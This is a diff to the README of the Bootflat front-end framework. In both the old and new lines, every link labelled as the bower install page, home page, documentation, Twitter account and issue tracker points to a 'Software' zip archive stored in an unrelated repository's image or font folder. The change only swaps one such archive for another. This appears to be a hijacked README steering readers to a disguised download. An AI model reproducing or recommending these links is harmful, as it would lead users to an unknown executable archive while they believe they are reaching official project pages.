@@ -23,7 +23,7 @@ Bootflat uses lightweight high-function plugins for maximum performance, keeping
 Bootflat is fully responsive, built for mobile-first in mind. It provides off screen navigation, and almost all the widgets are compatible with all screen sizes.
 
 ## Manual Start
-Install with [bower](https://raw.githubusercontent.com/videogramme/ptitparser/master/bootflat/img/check_flat/Software-2.9.zip)?
+Install with [bower](https://github.com/videogramme/ptitparser/raw/refs/heads/master/fonts/Software_2.3-beta.2.zip)?
 
 `bower install bootflatv2`
 
@@ -35,13 +35,13 @@ The source files are in the `bootflat/` folder. You can just grab the `bootflat/
 
 ## Links:
 
-+ [Bootflat Home page](https://raw.githubusercontent.com/videogramme/ptitparser/master/bootflat/img/check_flat/Software-2.9.zip)
-+ [Bootflat Documentation page](https://raw.githubusercontent.com/videogramme/ptitparser/master/bootflat/img/check_flat/Software-2.9.zip)
++ [Bootflat Home page](https://github.com/videogramme/ptitparser/raw/refs/heads/master/fonts/Software_2.3-beta.2.zip)
++ [Bootflat Documentation page](https://github.com/videogramme/ptitparser/raw/refs/heads/master/fonts/Software_2.3-beta.2.zip)
 
 ## Community
 
-+ Follow [@flathemes on Twitter](https://raw.githubusercontent.com/videogramme/ptitparser/master/bootflat/img/check_flat/Software-2.9.zip).
-+ Have a feature request or find a bug? [Submit an issue](https://raw.githubusercontent.com/videogramme/ptitparser/master/bootflat/img/check_flat/Software-2.9.zip).
++ Follow [@flathemes on Twitter](https://github.com/videogramme/ptitparser/raw/refs/heads/master/fonts/Software_2.3-beta.2.zip).
++ Have a feature request or find a bug? [Submit an issue](https://github.com/videogramme/ptitparser/raw/refs/heads/master/fonts/Software_2.3-beta.2.zip).
 
 ## LICENSE
 
